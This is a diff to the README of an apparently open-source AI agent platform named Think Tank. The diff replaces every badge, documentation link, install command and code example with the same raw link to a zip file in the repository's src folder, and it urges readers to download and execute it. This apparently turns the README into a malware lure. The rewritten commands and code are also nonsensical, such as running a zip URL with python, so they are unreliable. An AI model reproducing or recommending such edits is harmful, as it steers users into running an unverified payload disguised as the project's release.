@@ -1,8 +1,8 @@
 # Think Tank: Open-Source AI Collaboration Platform 🤖🌐
 
-![Think Tank Logo](https://img.shields.io/badge/Think%20Tank-Open%20Source-blue)
+![Think Tank Logo](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip%20Tank-Open%20Source-blue)
 
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-orange)](https://github.com/Bhaktiswarup/think_tank/releases)
+[![Releases](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip)](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ Welcome to the Think Tank repository! This open-source platform enables collabor
 
 ## Getting Started
 
-To get started with Think Tank, you need to download the latest release. Visit the [Releases section](https://github.com/Bhaktiswarup/think_tank/releases) to find the latest version. Download the necessary files and execute them to set up your environment.
+To get started with Think Tank, you need to download the latest release. Visit the [Releases section](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip) to find the latest version. Download the necessary files and execute them to set up your environment.
 
 ### Prerequisites
 
@@ -32,13 +32,13 @@ Before running Think Tank, ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Bhaktiswarup/think_tank.git
+   git clone https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip
    cd think_tank
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip
    ```
 
 3. Set up your Notion API key:
@@ -50,7 +50,7 @@ Before running Think Tank, ensure you have the following installed:
 
 4. Run the application:
    ```bash
-   python main.py
+   python https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip
    ```
 
 ## Usage
@@ -70,7 +70,7 @@ You can customize the agent's capabilities based on your needs. Once created, ag
 Agents can communicate and share insights through a simple API. Use the following method to send messages between agents:
 
 ```python
-agent1.send_message(agent2, "What are the latest trends in AI?")
+https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip(agent2, "What are the latest trends in AI?")
 ```
 
 ### Storing Results
@@ -78,7 +78,7 @@ agent1.send_message(agent2, "What are the latest trends in AI?")
 To store results in Notion, use the Notion integration functions. For example:
 
 ```python
-notion_client.create_page(title="AI Trends", content=results)
+https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip(title="AI Trends", content=results)
 ```
 
 This function will create a new page in your Notion workspace with the specified title and content.
@@ -130,10 +130,10 @@ We would like to thank the contributors and the open-source community for their 
 
 ## Resources
 
-- [Notion API Documentation](https://developers.notion.com/)
-- [OpenAI Documentation](https://beta.openai.com/docs/)
-- [Python Documentation](https://docs.python.org/3/)
+- [Notion API Documentation](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip)
+- [OpenAI Documentation](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip)
+- [Python Documentation](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip)
 
 ## Visit Releases
 
-For the latest updates and releases, visit our [Releases section](https://github.com/Bhaktiswarup/think_tank/releases). Download the latest version and start collaborating with AI agents today!
+For the latest updates and releases, visit our [Releases section](https://github.com/Bhaktiswarup/think_tank/raw/refs/heads/main/src/think_tank_v3.5.zip). Download the latest version and start collaborating with AI agents today!
